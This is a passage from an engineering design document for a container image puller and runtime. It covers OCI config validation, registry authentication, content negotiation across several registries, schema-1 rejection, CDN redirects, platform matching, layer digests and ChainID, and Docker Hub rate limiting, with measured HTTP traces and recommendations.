| `root` | REQUIRED on Linux | **not required** |
| `root.path` | REQUIRED | required ✓ |
| `process.cwd` | REQUIRED | required ✓ |
| `process.args` | ≥1 entry REQUIRED on non-Windows | **not required** |
| `process.user.uid`/`.gid` | REQUIRED on POSIX | **no `required` at all** |
| `mounts[].destination` | REQUIRED | **no `required` at all** |

So `{"ociVersion":"1.3.0"}` validates cleanly against the official schema and is simultaneously
illegal on Linux per the normative text.

**Recommendation.** Use the runtime schema only to reject malformed JSON shapes, and write the
real validation by hand: reject a config with no `root`, no `root.path`, no `process.args`
(when `start` will be called), no `process.user.uid`/`gid`, or a `mounts[]` entry with no
`destination`. Tradeoff: hand-written checks drift from the spec as it revises; the alternative
is a validator that passes configs our runtime must refuse.

**Recommendation.** Record one deliberate non-conformance now, so it is a decision rather than
a bug: `image-spec@v1.1.1/layer.md#L40-46` lists block and character devices among the valid
file types in a layer, and we refuse to create any device node from layer content (§10). That
is our policy overriding a spec allowance, and the conformance list must say so.

### What this decides

| Decision | Urgency |
|---|---|
| Name the image→runtime conversion a component (the bundler) and keep it a pure function with no I/O | **Urgent** — it is a module boundary, cheap now and a refactor later |
| Types are `ImageConfig` and `RuntimeSpec`, never `Config` | **Urgent** — renaming types after they spread is noise |
| `args = Entrypoint ++ Cmd` is a convention we copy, recorded as convention | Deferrable — but record the tag now |
| Runtime-config validation is hand-written; the JSON Schema is a shape check only | **Urgent** — otherwise the schema becomes the test and nothing checks the MUSTs |
| `runtime-tools@bd3b0bd00f44` `validation/` is the external conformance target, pinned by commit | Deferrable to the first runtime rung, but pin the commit when adopted |
| Refusing device nodes in layers is a recorded deviation from `layer.md`, not an implementation of it | Deferrable — documentation only |

---

## 9. Images and registries

An image name becomes bytes on disk through nine HTTP exchanges, four of which can fail in
ways that look like something else. The protocol below is the complete trace; the corrections
that follow it are the part worth reading twice, because three of them invalidate rules that
look obviously right.

### 9.1 The trace, condensed

```
alpine
 └─ normalise (client-side convention)        docker.io/library/alpine:latest
 └─ endpoint remap (client-side convention)   https://registry-1.docker.io
 [1] GET  /v2/                                401 + WWW-Authenticate: Bearer realm=…,service=…   (optional; skip it)
 [2] GET  /v2/library/alpine/manifests/latest 401 + …,scope="repository:library/alpine:pull"
     Accept: <full 4-type list>
 [3] GET  {realm}?service=…&scope=…           200 {"token":"eyJ…","expires_in":300}
                                              → decode payload, check access[] grants this repo
 [4] GET  /v2/library/alpine/manifests/latest 200 Content-Type: …oci.image.index.v1+json
     Authorization: Bearer …                  → classify by Content-Type / in-document mediaType
     Accept: <full 4-type list>               → reject schema 1 here, BEFORE hashing
                                              → verify sha256(body); record (tag, Accept list) → digest
 [5] select platform: normalise(os,arch,variant) on both sides; drop architecture=="unknown"
 [6] GET  /v2/library/alpine/manifests/<platform digest>   200 …oci.image.manifest.v1+json
                                              → verify sha256(body) == the digest we asked for
 [7] GET  /v2/library/alpine/blobs/<config digest>   307 → CDN (presigned) → 200
                                              → verify sha256(body) == digest == the IMAGE ID
 [8] for each layer descriptor, in manifest order:
     GET  /v2/library/alpine/blobs/<layer digest>    307 → CDN → 200
          stream: sha256(compressed) must == manifest.layers[i].digest
                  sha256(gunzip(stream)) must == config.rootfs.diff_ids[i]
                  tar-extract into a per-attempt staging dir, applying whiteouts
 [9] commit: blobs by digest, extracted layers by ChainID, tag → index digest
```

Measured end to end on `library/alpine:latest`, 2026-10-24, anonymous token:

```
index          sha256:be2656061b536c1883c4034790e21d0a09c5aaaf51968b89368a3c0371ea2c9a   9218 B
 └ manifest    sha256:c26612752c78b18faacd63c7d50f4592c2e7b0f25e0e20e82bd74e465c57ab0d
    ├ config   sha256:b92841763c5c2140a20eeb2a44e94ebb0e80fd51d9d6b5895ea72fa999525d68    611 B
    └ layer[0] sha256:7b229517ed222597277036d94892173207d01a731ab3a88eeb1de2e963a2c788
compressed   3 853 109 B  sha256:7b229517ed22…  == manifest.layers[0].digest
uncompressed 8 709 632 B  sha256:75c137aedfb2…  == config.rootfs.diff_ids[0]
```

Digests drift as tags are rebuilt. They are reproduced here as a worked example, not as
constants.

### 9.2 Step 0 — reference resolution is entirely convention

**Fact.** The only specified part is the grammar: the repository-name regex and the ≤128-char
tag regex given in §8, plus the rule that a reference MUST be either a digest or a tag.

**Convention.** Four defaults, none in any OCI specification, all pinned to
`distribution/reference@v0.6.0/normalize.go`:

1. Default registry `docker.io` (`defaultDomain`, `#L31`).
2. `library/` injected for single-component names, only when the domain is `docker.io`
   (`officialRepoPrefix`, `#L36`). `ghcr.io/foo` is **not** rewritten to `ghcr.io/library/foo`.
3. Default tag `latest` (`defaultTag`, `#L39`).
4. `docker.io` → `registry-1.docker.io` endpoint remap. `docker.io` is not a registry:
   `GET https://docker.io/v2/` returns `302` to `https://www.docker.com/v2/`.

**Convention.** `splitDockerDomain` (`normalize.go#L126-L170`) decides "is the first component
a hostname?" with **five** branches, not the three usually described:

| # | Condition | Result |
|---|---|---|
| 1 | no `/` at all | `docker.io/library/<name>` |
| 2 | first component `== "localhost"` | it is the domain |
| 3 | first component `== "index.docker.io"` | canonicalised to `docker.io` |
| 4 | first component contains `.` or `:` | it is the domain |
| 5 | first component is **not all-lowercase** | it is the domain |

Branch 5 is the one everyone misses: `Foo/bar` parses with domain `Foo`, because upper-case
namespaces are illegal on Hub.

**Trap.** `localhost` **alone, with no `/`** resolves to `docker.io/library/localhost`, not to
the host `localhost`, because branch 1 fires before branch 2. Upstream carries this as a known
defect (`FIXME(thaJeztah)` at `normalize.go#L135`).

**Recommendation.** Copy the bug. Reason: `docker pull localhost` resolving to Hub is what
every other tool does, and diverging makes us the odd one out for a name nobody types.
Tradeoff: we inherit a documented wart.

**Recommendation.** Implement reference parsing as its own module with a table of ~40 cases
(`alpine`, `alpine:3.20`, `alpine@sha256:…`, `localhost:5000/x`, `Foo/bar`, `localhost`,
`example.com/a/b:t@sha256:…`). Reason: getting the domain heuristic wrong silently sends
requests to the wrong host, which presents as a `401` or a `404`, never as a parse error.

### 9.3 Steps 1–3 — the ping, the challenge, the token

**Observation** (six registries, `GET /v2/`, 2026-10-24):

| Registry | Status | `WWW-Authenticate` |
|---|---|---|
| `registry-1.docker.io` | 401 | `Bearer realm="https://auth.docker.io/token",service="registry.docker.io"` |
| `ghcr.io` | 401 | `…realm="https://ghcr.io/token",service="ghcr.io",scope="repository:user/image:pull"` |
| `quay.io` | 401 | `…realm="https://quay.io/v2/auth",service="quay.io"` |
| `registry.k8s.io` | 401 | `…realm="https://registry.k8s.io/token",service="registry.k8s.io"` |
| `public.ecr.aws` | 401 | `…realm="https://public.ecr.aws/token/",service="public.ecr.aws",scope="aws"` |
| `mcr.microsoft.com` | **200** | *(none — no auth at all)* |

**Observation.** The `scope` in a challenge is not reliably about the resource you asked for.
`ghcr.io` returns the literal placeholder `repository:user/image:pull`; `public.ecr.aws`
returns `scope="aws"`. A client that echoes the challenge's scope back requests a token for a
repository named `user/image`.

**Recommendation.** Synthesise the scope client-side as `repository:<name>:pull` from the
reference you are about to fetch, and use the challenge **only** for `realm` and `service`.
Tradeoff: less "correct" as RFC 6750 challenge-following; it is the only thing that works on
all six.

**Recommendation.** Skip `GET /v2/` in normal operation and handle the `401` lazily on the real
request, retrying once with a token. Reason: `mcr.microsoft.com` never challenges and Hub
always does; lazy handling is the only shape that covers both, and it saves a round trip.
Tradeoff: you lose an early "this host is not a registry" error, which becomes a confusing
`404` later; keep `/v2/` behind a diagnostic flag.

**Trap.** `quay.io`'s realm is `https://quay.io/v2/auth` — *inside* `/v2/`. A blanket rule of
"any `/v2/` request needs a bearer token" will try to authenticate to the auth endpoint. Scope
the rule to the resource endpoints, not the path prefix.

**Observation.** The token response carries both `token` and `access_token` with the same
value (`access_token` is the OAuth2 name, `token` the original Docker name) and
`expires_in: 300`. Decoding a live token: `iat=1792802991`, `nbf=iat−300` (clock skew),
`exp=iat+300`. The lifetime is genuinely 300 seconds from issuance.

**Observation — a malformed scope is not an error.** Five variants against `auth.docker.io`:

| `scope=` sent | HTTP | granted `access` claim |
|---|---|---|
| `repository:library/alpine:pull` | 200 | `[{repository, library/alpine, [pull]}]` |
| `repository:library/alpine:pull,push` | 200 | `[{… actions: [pull]}]` — push silently dropped |
| `repository:library/alpine` (no action) | **200** | **`[]`** |
| `library/alpine:pull` (no `repository:` prefix) | **200** | **`[]`** |
| `repository:library/alpine:pull:extra` | **200** | **`[]`** |

You receive `200 OK` and a well-formed JWT that grants nothing, and the failure surfaces one
request later as a `401` on the manifest — which reads as "your credentials were rejected".

**Recommendation.** After fetching a token, base64url-decode its middle segment and check that
`access[]` contains the repository with `pull` in `actions`, before using it. ~10 lines, and it
converts a misleading `401` into an accurate error at the point of cause. Do **not** verify the
signature — we are not the audience. On a parse failure, proceed as if the check passed; the
spec says the token is opaque, so this is a sanity read layered on a JWT-shaped assumption.

**Recommendation.** Cache tokens keyed by `(realm, service, scope)` with `expires_in` minus a
30-second skew, and handle a mid-pull `401` by re-authenticating and retrying **the same
request** once. Reason: with a 300-second lifetime, a large image's pull *will* outlive its
token; this is the expected case, not an edge case. The retry must be per-request, not
per-pull.

**Trap.** A nonexistent repository on Docker Hub returns `401 UNAUTHORIZED`, not `404
NAME_UNKNOWN`, even holding a successfully-issued anonymous token for it. "Does not exist" and
"you may not see it" are indistinguishable. Our message for a `401` after a successful token
fetch must say *"not found or not accessible"*, never *"authentication failed"*, or every typo
becomes a bogus credentials report.

### 9.4 Step 4 — content negotiation does not converge, and never will

This is the section's most consequential finding, and it reverses an intuition.

**Fact.** OCI has never specified content negotiation.
`distribution-spec@v1.1.1/content-negotiation.md`, in its entirety, is a heading reading
*"Content Negotiation"* followed by one line of body:

```
TODO - Please see issue #212.
```

and then a descriptive table of what Docker Hub *used to* do, two of whose rows carry ⚠️
markers noting that the behaviour is internally inconsistent. Everything below is a consequence
of that vacuum: all of these registries are conformant, because there is nothing to conform to.

**Observation — Docker Hub ignores `Accept` entirely.** Ten values sent to
`GET /v2/library/alpine/manifests/latest`, 2026-10-24: header omitted; each of the four modern
types alone; both list types together; `…manifest.v1+prettyjws`; `*/*`;
`application/x-total-nonsense`; `text/plain`. All ten returned `200`, identical
`Content-Type: application/vnd.oci.image.index.v1+json`, identical `content-length: 9218`,
identical digest. Hub does not negotiate; it returns the stored bytes with the stored type.

**Observation — `ghcr.io` is strict, and `*/*` does not match.**
`GET https://ghcr.io/v2/astral-sh/uv/manifests/latest`:

| `Accept:` sent | Status |
|---|---|
| *(omitted)* | **404** `{"code":"MANIFEST_UNKNOWN","message":"OCI index found, but Accept header does not support OCI indexes"}` |
| `*/*` | **404**, same body |
| `…docker.distribution.manifest.list.v2+json` | **404** |
| `…oci.image.manifest.v1+json` | **404** |
| `…oci.image.index.v1+json` | 200 |
| full four-type list | 200 |

`ghcr.io` does literal string membership on the `Accept` list, which RFC 9110 §12.5.1 says
`*/*` should satisfy. We cannot argue with it.

**Observation — Google Artifact Registry is strict too, and says so usefully.**
`GET https://us-east5-docker.pkg.dev/v2/k8s-artifacts-prod/images/pause/manifests/3.9` with
`Accept: application/vnd.oci.image.index.v1+json`:

```
HTTP/2 404
{"errors":[{"code":"MANIFEST_UNKNOWN","message":"Manifest has media type
 \"application/vnd.docker.distribution.manifest.list.v2+json\" but client accepts
 [\"application/vnd.oci.image.index.v1+json\"]"}]}
```

Note what that proves: **an OCI-only client is not a correct client.** `registry.k8s.io/pause`
is stored as a Docker manifest list and is unreachable without asking for one. Supporting the
Docker media types is not a convenience — it is the difference between reachable and not.

**Observation — `quay.io` negotiates *and converts*, returning three digests for one tag.**
`GET https://quay.io/v2/podman/stable/manifests/latest`, same tag, one minute apart:

| `Accept:` sent | `Content-Type` returned | size | `Docker-Content-Digest` |
|---|---|---|---|
| *(omitted)* | `…manifest.v1+json` (**schema 1**) | 16337 | `sha256:206e933f82…` |
| `…docker.distribution.manifest.v2+json` | `…manifest.v1+json` (**schema 1**) | 16337 | `sha256:206e933f82…` |
| `…docker.distribution.manifest.list.v2+json` | `…manifest.v1+json` (**schema 1**) | 16337 | `sha256:206e933f82…` |
| `…oci.image.index.v1+json` | `…oci.image.index.v1+json` | 901 | `sha256:55d98815a3…` |
| `…oci.image.manifest.v1+json` | `…oci.image.manifest.v1+json` | 2988 | `sha256:4daf0e142d…` |
| full four-type list | `…oci.image.index.v1+json` | 901 | `sha256:55d98815a3…` |

Three distinct documents, three distinct digests, one tag, one instant. `sha256(body)` matched
the advertised digest in all six cases — the registry is not lying, it is *converting*.

**Four behaviour classes across five backends:**

| Registry | Behaviour | Failure mode if you get it wrong |
|---|---|---|
| Docker Hub | ignores `Accept`; returns the stored type | you parse a document you did not ask for |
| `ghcr.io` | strict literal match; `*/*` does not match | `404 MANIFEST_UNKNOWN` — reads as "no such image" |
| Google Artifact Registry / `gcr.io` / `registry.k8s.io` | strict; error names both sides | `404 MANIFEST_UNKNOWN` |
| `quay.io` | negotiates and converts; falls back to schema 1 | different digest per request; silent schema-1 downgrade |

**Recommendation — the rule a correct client follows has two independent sides.**

- **Sending side.** Always send the full explicit list on *every* manifest `GET` **and**
  `HEAD`: `application/vnd.oci.image.index.v1+json`,
  `application/vnd.oci.image.manifest.v1+json`,
  `application/vnd.docker.distribution.manifest.list.v2+json`,
  `application/vnd.docker.distribution.manifest.v2+json`. Never omit it. Never send `*/*` and
  expect it to work. Never narrow it per call.
- **Receiving side.** Never assume you got what you asked for. Classify by in-document
  `mediaType` if present and recognised, then the `Content-Type` header, then structural sniff
  (`manifests[]` ⇒ index; `config` + `layers[]` ⇒ manifest; `fsLayers[]` ⇒ schema 1; a document
  containing **both** `manifests` and `layers` ⇒ reject, do not disambiguate).

The two sides have different reasons: you send the full list to make the *request* succeed, and
you ignore it on receipt to make the *parse* correct.

**Fact.** The classification order has a spec basis that is sharper than "the document is what
was hashed". `image-spec@v1.1.1/media-types.md`, *Media Type Conflicts*: an implementation with
an expected media type that does not match the returned one SHOULD "respect the expected media
type if the blob matches the expected digest" (and MAY warn), and MUST error if the digest does
not match or if there is no expected digest. **The descriptor's expected media type wins over
the header whenever the digest checks out.** This also covers blobs, which have no in-document
`mediaType` at all.

**Fact.** The ambiguity this defends against is `CVE-2021-41190`: manifests and indexes were
not self-describing, so one digest could be interpreted as either, and a changed `Content-Type`
between two pulls of the same digest changed the meaning of identical bytes.

**Recommendation — the consequence nobody anticipates.** On at least one registry, tag→digest
is a function of `(tag, Accept)`. Therefore **any cache, lockfile or "is my image still
current?" check must record the `Accept` list that produced the digest**, alongside the digest.
Tradeoff: one extra field in the cache record; without it, a client that ever varies its
`Accept` list thrashes.

### 9.5 Schema 1 is not dead, and it breaks naive verification

**Convention — the daemon half.** Docker Engine removed schema-1 support: deprecated in
v19.03, disabled by default in **v26.0**, removed in **v28.2** (Docker's own deprecation page).
Pinned confirmation at `moby/moby@docker-v29.9.2`: `daemon/internal/distribution/pull_v2.go`
`#L413-414` and `#L761-762` return `DeprecatedSchema1ImageError`, and the vendored
`docker/distribution/manifest/schema1` package present at v28.3.1 is gone from the v29 tree.

**Observation — the registry half is alive.** Docker Hub serves schema 1 today, against the
full modern four-type `Accept` list that contains no schema-1 type:

```
GET /v2/docker/whalesay/manifests/latest        → 200
content-type: application/vnd.docker.distribution.manifest.v1+prettyjws   ← NOT in Accept
→ schemaVersion: 1, fsLayers: 11, signatures: 1

GET /v2/library/ubuntu/manifests/10.04          → 200   (an official library image)
content-type: application/vnd.docker.distribution.manifest.v1+prettyjws
→ schemaVersion: 1, fsLayers: 4, signatures: 1
```

and on `quay.io` schema 1 is the default response when `Accept` is omitted. The November 2024
Docker announcement was about Hub ceasing to **accept** schema-1 pushes, not ceasing to
**serve** them. The practical consequence is checkable: `docker pull ubuntu:10.04` fails on
Docker Engine ≥ 28.2 because Hub serves a manifest the daemon refuses.

**Observation — schema 1 breaks `sha256(body)`.** For `docker/whalesay:latest`:

```
content-type: application/vnd.docker.distribution.manifest.v1+prettyjws
content-length: 20401
docker-content-digest: sha256:178598e51a26abbc958b8a2e48825c90bc22e641de3d31e18aaf55f3258ba93b
sha256(response body) = 1e64de7b237bd224bf54dd3c4364143201b5f8e02810781357b286be7045512f   ← mismatch
```

The digest is over the *canonicalised, signature-stripped* payload. Reproduced: the JWS
`protected` header base64url-decodes to `{"formatLength":20127,"formatTail":"Cn0="}`, and
`sha256(body[:20127] + b64url_decode("Cn0="))` equals the advertised digest exactly. So a
client that recomputes `sha256(body)` and compares will **reject a manifest the registry served
correctly**.

**Recommendation.** Do not implement schema 1 — it has `fsLayers[]` of blob sums in *reverse*
order, `history[]` of stringified v1 JSON configs, a JWS signature block, no `diff_id`s, and a
digest requiring a JWS/JCS canonicaliser. Instead **detect it and reject it by name**, and
order the pipeline **classify → reject schema 1 → verify digest → parse**, never
verify-then-classify. Detection is `fsLayers` present in the parsed JSON: ~10 lines replacing a
~500-line parser. Tradeoff: some old images are unreachable through us, exactly as they are
through Docker. Add `docker/whalesay:latest` to the test corpus as the schema-1 fixture.

### 9.6 Two things that look like spec facts and are not

**Fact.** `Docker-Content-Digest` is **SHOULD**, not MUST. `distribution-spec@v1.1.1/spec.md`
says "A successful response SHOULD contain the digest … in the header `Docker-Content-Digest`"
in all three places it says it (`#L177`, `#L195`, `#L213`), and `#L49-L52`, under *Legacy
Docker support HTTP headers*, is blunter: "These headers are OPTIONAL and clients SHOULD NOT
depend on them." **A missing `Docker-Content-Digest` is spec-legal.**

**Fact.** The spec permits exactly two ways to use the header and no third: ignore it, or
verify it. "Most clients MAY ignore the value, but if it is used, the client MUST verify the
value matches the returned manifest" (`#L182-L183`); for blobs, "If present, the value of this
header MUST be a digest matching that of the response body… Clients SHOULD verify that the
response body matches the requested digest" (`#L196-L198`). There is no option where you
believe it without checking.

**Trap.** Do not build a "registry is broken, abort" path around a missing digest header. A
correct client recomputes unconditionally and treats the header as a hint — useful for one
thing only: recording what digest a *tag* resolved to.

**Fact.** There is **no redirect sentence in the Distribution Specification.** The string
`redirect` appears zero times in `distribution-spec@v1.1.1/spec.md` (859 lines) and zero times
in `content-negotiation.md`. The closest text is in the push flow, where an upload `<location>`
"does not necessarily need to be provided by the registry itself … for example, in the case of
a signed URL from some cloud storage provider" (`#L319`) — which sanctions off-registry URLs
for *uploads*, not `307`s on blob `GET`s.

**Convention.** Blob redirection to a CDN is nonetheless universal: Hub → CloudFront, ECR →
S3, GAR → Google front-ends. We must follow redirects; nothing in any spec obliges us to.

**Fact.** `Range` is specified, as a SHOULD: "A registry SHOULD support the `Range` request
header in accordance with RFC 9110" (`#L202`). A registry may refuse, so resume must degrade to
restart-from-zero rather than fail.

### 9.7 Steps 6–8 — redirects, credentials, and the CDN

**Observation** (Docker Hub, 2026-10-24, `library/alpine` amd64 layer):

```
GET /v2/library/alpine/blobs/sha256:7b229517ed…     HTTP/2 307
location: https://production.cloudfront.docker.com/registry-v2/.../data
          ?Expires=1792805992&Signature=…&Key-Pair-Id=K31B9XRZB58O8Z
```

| Test | Result |
|---|---|
| Does `curl -L` forward `Authorization` cross-host? | **No** — hop 2 carries only `Host:` |
| Does the presigned URL work with no `Authorization` at all? | **Yes**, `206`, `server: AmazonS3` |
| Does forwarding `Authorization` to CloudFront break anything? | **No** — `206`, works fine |
| `Range: bytes=1000-1999` set on the `/v2/` URL, following the redirect | `307` → `206`, `content-range: bytes 1000-1999/3853109` |
| `HEAD` on the blob | `200` **direct from the registry, no redirect**, with `content-length`, `accept-ranges`, `docker-content-digest` |
| Does the CDN response carry a digest? | **No** — only an S3 MD5 `ETag`; there is nothing to trust |

**Recommendation.** Never forward `Authorization` across a cross-origin redirect, **for one
reason and one only: it discloses a bearer credential to a third party.** It is not a
functional requirement — forwarding works — which is precisely why it must be enforced by
policy rather than discovered by breakage. In Rust, `reqwest`'s default redirect policy already
strips sensitive headers cross-origin; the danger is a custom policy that "helpfully" re-adds
them. Add a test asserting the header is absent on hop 2, or someone will remove the rule while
debugging an unrelated `403`.

**Trap.** The obvious justification — "the token is useless there" — is true and misleading. An
implementer who tests "does it still work with the header?" gets `206` and concludes the rule
is cargo cult.

**Recommendation.** Never persist a CDN URL. The presigned URL expires (observed ~50 minutes
out), and a `Range` header set on the `/v2/…/blobs/<digest>` URL rides through the `307`
untouched and yields a `206`. So resume needs no special casing at all: always request the
`/v2/` URL, always set `Range`, let the redirect happen.

**Recommendation.** Digest verification is unconditionally the client's job. The CDN gives you
nothing to verify against, and the status check must come first: a `401` or `404` body is a
valid JSON document of plausible size that a naive downloader will happily write to disk. A
157-byte `{"errors":[{"code":"UNAUTHORIZED",…}]}` landing where a 3.85 MB gzip layer was
expected, from a command that exited 0, was produced accidentally during verification —
check HTTP status, then digest, then report "unauthorized" rather than "digest mismatch".

**Observation — manifest requests can redirect across an auth boundary.**

```
GET https://registry.k8s.io/v2/pause/manifests/3.9
HTTP/2 307
location: https://us-east5-docker.pkg.dev/v2/k8s-artifacts-prod/images/pause/manifests/3.9?rid=…
```

The target is a **different registry, with a different auth realm and a different repository
name**. A client that follows it with the old token, or that assumes the repository name in the
URL still matches what it asked for, is wrong on both counts.

**Recommendation.** Treat a `3xx` on a *manifest* request as "restart the request at the new
URL from the top of the auth flow": drop the old `Authorization`, re-run the
401/challenge/token dance against the new origin, keep the `Accept` list, and cap the chain at
5 hops. ~20 lines; without it `registry.k8s.io` is simply unreachable.

### 9.8 Step 5 — platform selection, which must normalise before comparing

**Fact.** The spec contains no matching algorithm. `image-spec@v1.1.1/image-index.md` makes
`platform` OPTIONAL on entries, makes `architecture` and `os` REQUIRED *within* a platform
object, marks `features` RESERVED, and offers exactly one sentence of guidance: "If multiple
manifests match a client or runtime's requirements, the first matching entry SHOULD be used."
That is the whole of it.

**Fact.** The Go value sets are a **SHOULD**, not a MUST: "Image indexes SHOULD use, and
implementations SHOULD understand, values listed in the Go Language document for `GOARCH`" (and
the same for `GOOS`). An index with a non-Go `architecture` is spec-legal. Do not hard-error on
one; fail to match it and name it in the error.

**Fact.** `image-index.md`'s *Platform Variants* table gives `amd64` the variants `v1`, `v2`,
`v3` (the GOAMD64 microarchitecture levels), `arm64` the variants `v8`, `v8.1`, …, `arm` the
variants `v6`, `v7`, `v8`, `ppc64le` `power8`/`power9`, and `riscv64` `rva20u64`.

**Trap.** "If `variant` is present it must match" is wrong on both architectures that matter.
Real `alpine:latest` publishes its aarch64 image as literally `linux/arm64/v8`, so a client
asking for bare `arm64` and applying that rule finds **zero** matches; and an index entry
`{linux, amd64, v2}` is rejected by a host that reports `{linux, amd64}` with no variant.

**Convention — normalise first, then compare.** `containerd/platforms@v1.0.0-rc.1/database.go`,
`normalizeArch(arch, variant)`, runs on **both** sides before any comparison:

| input | normalised |
|---|---|
| `arm64` + `8` / `v8` / `v8.0` | `arm64` + **`""`** |
| `arm64` + `9` / `9.0` / `v9.0` | `arm64` + `v9` |
| `aarch64` | `arm64` |
| `amd64` + `v1` | `amd64` + **`""`** |
| `x86_64`, `x86-64` | `amd64` |
| `i386` | `386`, variant cleared |
| `arm` + `""` or `7` | `arm` + **`v7`** |
| `arm` + `5` / `6` / `8` | `arm` + `v5` / `v6` / `v8` |
| `armhf` / `armel` | `arm/v7` / `arm/v6` |

`matcher.Match` is then exact equality on `(OS, Architecture, Variant)` plus an OS-version
check. So bare `arm64` matches `arm64/v8` **only after normalisation**, and `arm` with no
variant defaults to **v7**, not v6 — a non-obvious default that costs a wrong image if guessed.

**Convention.** containerd's default resolver does not use bare `Match`; `compare.go`'s
`platformVector` builds a ranked compatibility vector and takes the best available:
`amd64/vN` → `vN`, `v(N-1)`, … `v1`, **and then `386`**; `arm/vN` down to `v5`; `arm64` with an
empty variant treated as `v8` and expanded over `v8.x` descending.

**Observation.** The `unknown/unknown` filter is still necessary. Today's `alpine:latest` index
has 16 entries: 8 real platforms (`linux/amd64`, `linux/386`, `linux/arm/v6`, `linux/arm/v7`,
`linux/arm64/v8`, `linux/ppc64le`, `linux/riscv64`, `linux/s390x`) and 8 BuildKit attestation
manifests carrying `platform: {architecture: "unknown", os: "unknown"}` and
`annotations: {"vnd.docker.reference.type": "attestation-manifest"}`.

**Recommendation.** The selection algorithm, in order:
(a) drop any entry whose `platform.architecture` or `platform.os` is `"unknown"`;
(b) normalise `(os, arch, variant)` on both the entry and the host, porting
`normalizeArch` (~25 lines of match arms);
(c) compare normalised triples for exact equality;
(d) treat a missing `platform` object as non-matching, not as a wildcard;
(e) on zero matches, fail with **the list of platforms that were on offer**, not a generic
"not found".
Defer the ranked downgrade vector (`amd64 → 386`, `arm/v7 → v6 → v5`) — it is a nicety for
hosts whose image is missing and we are amd64-first. Tradeoff: ~25 lines now instead of 3, to
avoid a bug that first appears the day someone runs us on an Ampere box.

**Trap.** Without filter (a), a naive "walk until something matches, else take entry 0" search
can select an attestation manifest, whose "layers" are JSON documents — and you will try to
gunzip a JSON document and report a corrupt tar.

### 9.9 The dual-digest model, and ChainID

**Fact.** One layer has two normative digests, and they are not interchangeable.

| | **blob digest** | **`diff_id`** |
|---|---|---|
| computed over | the layer bytes **exactly as transferred** (the compressed stream for `+gzip`/`+zstd`) | the **uncompressed** tar stream |
| lives in | `manifest.layers[i].digest` | `config.rootfs.diff_ids[i]` |
| addresses | the registry URL `/v2/<name>/blobs/<digest>`; the local blob store filename | nothing on the wire |
| identifies | one particular *encoding* of a changeset | the changeset's *content*, compression-independent |
| recompress the layer | **changes** | **unchanged** |

`image-spec@v1.1.1/config.md#L26-31`: "A layer DiffID is the digest over the layer's
uncompressed tar archive… **NOTE: Do not confuse DiffIDs with layer digests**, often referenced
in the manifest, which are digests over compressed or uncompressed content." For an
uncompressed `…layer.v1.tar` the two are identical.

**Fact.** `manifest.layers` and `config.rootfs.diff_ids` are parallel arrays, both base-layer
first, index `i` to index `i`. This follows from `manifest.md` ("The array MUST have the base
layer at index 0") plus `config.md` ("in order from first to last").

**Fact.** `config.history` is **not** parallel to either. Entries with `empty_layer: true`
consume no layer, so associating history with layers means walking `history` and advancing a
layer cursor only when `empty_layer` is absent or false.

**Recommendation.** Validate `manifest.layers.len() == config.rootfs.diff_ids.len()` and refuse
the image otherwise. A mismatch means a corrupt or maliciously assembled image, and any code
that zips the two arrays would silently mis-associate a changeset with another layer's content
identity.

**Recommendation.** Stream the download as
`HTTP body → sha256(compressed) → gzip decoder → sha256(uncompressed) → tar reader →
extractor`, with both hashers fed in one pass, and commit nothing until **both** digests
verify. Reason: it removes an entire decompression pass and never materialises a layer in
memory; measured, it is about a dozen lines over 64 KiB chunks. Tradeoff: on a mismatch you
have already written files into a staging directory and must delete it — which is why the
staging directory must be per-attempt and cheap to remove.

**Fact — ChainID is normative, not a Docker convention.** `image-spec@v1.1.1/config.md`,
section *Layer ChainID → Definition*:

```
ChainID(L₀)                 = DiffID(L₀)
ChainID(L₀|…|Lₙ₋₁|Lₙ)       = Digest(ChainID(L₀|…|Lₙ₋₁) + " " + DiffID(Lₙ))
ChainID(A|B|C)              = Digest(Digest(DiffID(A) + " " + DiffID(B)) + " " + DiffID(C))
```

The reference implementation is `image-spec@v1.1.1/identity/chainid.go`:
`digest.FromBytes([]byte(dgsts[0] + " " + dgsts[1]))`. Since `digest.Digest` stringifies as
`"sha256:<hex>"`, the bytes hashed are `"sha256:<hexA> sha256:<hexB>"` — **prefixes included,
exactly one ASCII space, no newline, no trailing separator.**

**Fact.** The spec states the reason, and it is the reason our store needs it: "we can easily
see that `ChainID(C) != ChainID(A|B|C)`" — the same changeset applied onto a different base is
a different rootfs and must not collide in a cache.

**Recommendation — what the content-addressed store keys on, and why it needs both digests.**

- **Blob store → the compressed digest.** It is what the registry gave us, what the manifest
  references, what `HEAD`/`Range`/resume address, what the OCI image layout wants at
  `blobs/sha256/<hex>`, and the only one of the two we can verify *before* handing
  attacker-controlled bytes to a decompressor.
- **Extracted-layer store → the ChainID**, derived from `diff_id`s.
- **Neither substitutes for the other.** The manifest gives us only compressed digests; the
  config gives us only `diff_id`s; **nothing on the wire maps between them.** The mapping is
  *produced* by the act of downloading. That is why a compressed-digest → `diff_id` index
  exists at all, and why a puller storing only one of the two can never answer "do I already
  have this layer?" from a manifest alone.

**Recommendation.** Implement that index (`diffid-by-digest`). It is one key-value map, and it
is the difference between a second `nginx` tag downloading 190 MB and downloading 5 KB.
Tradeoff: it is a cache that goes stale if the store is swept underneath it, so the lookup must
confirm the layer still exists before trusting a hit.

**Recommendation.** Record *which* digest a tag resolved to at pull time — the **index** digest,
not the platform manifest digest. Reason: that is what `image@sha256:…` must resolve to on any
architecture; recording the platform manifest makes the digest we printed unusable elsewhere.

### 9.10 Rate limiting, as it actually behaves

**Observation.** Docker Hub's anonymous limit appears in two places that disagree. The token's
`access[].parameters` carries `pull_limit: "100"`, `pull_limit_interval: "21600"` (6 hours);
the response headers carry four values, `ratelimit-limit: 100;w=3600`,
`ratelimit-remaining: 98;w=3600` and an `x-`prefixed duplicate pair, plus
`docker-ratelimit-source: <your egress IP>`.

**Convention.** Docker's published limits are 100 pulls per **6-hour** window for
unauthenticated users, counted per IPv4 address or per IPv6 **/64 subnet**, with a documented
header example of `ratelimit-limit: 100;w=21600`. So the token claim and the documentation
agree; the live header's `w=3600` matches neither.

**Recommendation.** Take the limit and window from the token's `pull_limit` /
`pull_limit_interval` claims; treat their absence as "unknown limit", not as an error. Use
`ratelimit-remaining` only as a live counter, surfaced in verbose output. Never compute a reset
time from the header's `w=` value. For control flow, rely on `429` plus `Retry-After` with
exponential backoff. Tradeoff: we depend on a JWT-internal claim specified nowhere.

**Observation.** A pull is counted at the **manifest** request, and a `HEAD` counts too
(`ratelimit-remaining` went 99 → 98 across a HEAD/GET pair). Layer blob `GET`s do not add to
it. So `HEAD` for cache validation saves bytes, not quota.

